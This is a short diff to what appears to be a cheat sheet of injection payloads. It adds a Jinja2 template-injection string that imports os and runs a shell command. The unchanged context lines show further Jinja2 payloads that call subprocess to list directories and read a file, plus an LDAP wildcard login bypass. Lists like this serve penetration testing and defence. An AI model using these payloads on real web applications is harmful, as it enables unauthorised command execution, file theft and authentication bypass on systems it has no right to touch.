@@ -27,7 +27,7 @@ Python - Jinja2
 {{7*7}}
 {{"".class.mro[1].subclasses()[157].repr.globals.get("builtins").get("import")("subprocess").check_output(['ls', '-lah'])}}
 {{"".class.mro[1].subclasses()[157].repr.globals.get("builtins").get("import")("subprocess").check_output(['cat', 'file.txt'])}}
-
+{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("hostname")["read"]() }}
 
 LDAP
 LOGIN: x*        PASSWORD: *
